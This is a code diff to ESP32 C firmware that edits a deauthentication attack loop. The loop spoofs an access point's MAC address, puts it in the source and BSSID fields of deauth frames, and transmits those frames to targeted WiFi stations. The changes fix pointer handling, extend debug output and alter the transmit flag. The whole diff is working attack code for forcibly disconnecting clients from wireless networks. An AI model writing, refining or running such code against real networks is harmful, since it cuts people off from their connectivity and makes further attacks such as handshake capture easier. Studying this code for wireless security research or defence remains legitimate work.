@@ -78,6 +78,7 @@ void deauthLoop(void *pvParameter) {
                 /* NOOP */
         }
         uint8_t devMAC[6];
+
         for (int i = 0; i < targetCount; ++i) {
             // Set MAC as needed
             switch (deauthMAC) {
@@ -107,19 +108,18 @@ void deauthLoop(void *pvParameter) {
                         /* Set frame and device MAC */
                         memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], targetSTA[i]->apMac, 6);
                         memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], targetSTA[i]->apMac, 6);
-                        //ESP_LOGI(DEAUTH_TAG, "Setting MAC: %02x:%02x:%02x:%02x:%02x:%02x",targetSTA[i].apMac[0],targetSTA[i].apMac[1],targetSTA[i].apMac[2],targetSTA[i].apMac[3],targetSTA[i].apMac[4],targetSTA[i].apMac[5]);
-                        if (esp_wifi_set_mac(WIFI_IF_AP, targetSTA[i]->apMac) != ESP_OK) {
+//                        ESP_LOGI(DEAUTH_TAG, "Setting MAC: %02x:%02x:%02x:%02x:%02x:%02x",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
+                        if (esp_wifi_set_mac(WIFI_IF_AP, &(targetSTA[i]->apMac[0])) != ESP_OK) {
                             ESP_LOGW(DEAUTH_TAG, "Setting MAC to %02x:%02x:%02x:%02x:%02x:%02x failed, oh well",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
                         }
                     } else {
                         #ifdef DEBUG_VERBOSE
-                            printf("No AP info, not changing SRC\n");
+                            printf("No AP info, not changing SRC from %02x:%02x:%02x:%02x:%02x:%02x\n",deauth_pkt[DEAUTH_SRC_OFFSET],deauth_pkt[DEAUTH_SRC_OFFSET+1],deauth_pkt[DEAUTH_SRC_OFFSET+2],deauth_pkt[DEAUTH_SRC_OFFSET+3],deauth_pkt[DEAUTH_SRC_OFFSET+4],deauth_pkt[DEAUTH_SRC_OFFSET+5]);
                         #endif
                     }
                     break;
                 default:
                         ESP_LOGE(DEAUTH_TAG, "Invalid MAC action %d", deauthMAC);
-                    continue;
             }
             /* Set destination */
             #ifdef DEBUG_VERBOSE
@@ -128,7 +128,7 @@ void deauthLoop(void *pvParameter) {
             memcpy(&deauth_pkt[DEAUTH_DEST_OFFSET], targetSTA[i]->mac, 6);
 
             // Transmit
-            esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), false);
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), true);
         }
 
         // post-loop
